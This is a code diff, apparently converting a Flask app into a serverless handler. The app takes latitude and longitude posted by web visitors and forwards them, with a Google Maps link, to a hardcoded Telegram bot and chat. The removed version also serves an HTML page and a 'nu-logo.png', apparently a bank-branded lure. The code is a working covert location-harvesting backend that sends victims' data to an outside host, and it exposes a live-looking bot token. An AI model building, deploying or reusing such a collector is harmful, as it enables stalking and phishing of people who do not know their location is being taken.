@@ -1,41 +1,35 @@
-from flask import Flask, request, render_template_string, send_from_directory
 import requests
-import os
+import json
 
-app = Flask(__name__)
-
-# Seu token e seu chat_id
 TELEGRAM_BOT_TOKEN = '7715557687:AAHvJdcOYIqjIpGpBSsv66Irb9ViN5tZvMs'
 TELEGRAM_CHAT_ID = '2063662084'
 
-# Função para ler o arquivo HTML externo
-def get_html_content():
-    with open('../index.html', 'r', encoding='utf-8') as file:
-        return file.read()
+def handler(request):
+    if request.method == "POST":
+        try:
+            data = request.json
+            latitude = data.get('latitude')
+            longitude = data.get('longitude')
 
-@app.route('/')
-def home():
-    html_content = get_html_content()
-    return render_template_string(html_content)
+            message = f"Nova localização recebida:\nLatitude: {latitude}\nLongitude: {longitude}\nGoogle Maps: https://maps.google.com/?q={latitude},{longitude}"
 
-@app.route('/nu-logo.png')
-def serve_logo():
-    return send_from_directory('..', 'nu-logo.png')
+            requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage', data={
+                'chat_id': TELEGRAM_CHAT_ID,
+                'text': message
+            })
 
-@app.route('/send_location', methods=['POST'])
-def send_location():
-    data = request.get_json()
-    latitude = data.get('latitude')
-    longitude = data.get('longitude')
+            return {
+                "statusCode": 200,
+                "body": json.dumps({"status": "ok"})
+            }
 
-    message = f"Nova localização recebida:\nLatitude: {latitude}\nLongitude: {longitude}\nGoogle Maps: https://maps.google.com/?q={latitude},{longitude}"
+        except Exception as e:
+            return {
+                "statusCode": 500,
+                "body": json.dumps({"error": str(e)})
+            }
 
-    requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage', data={
-        'chat_id': TELEGRAM_CHAT_ID,
-        'text': message
-    })
-
-    return 'ok', 200
-
-if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=5000)
+    return {
+        "statusCode": 405,
+        "body": json.dumps({"error": "Method Not Allowed"})
+    }
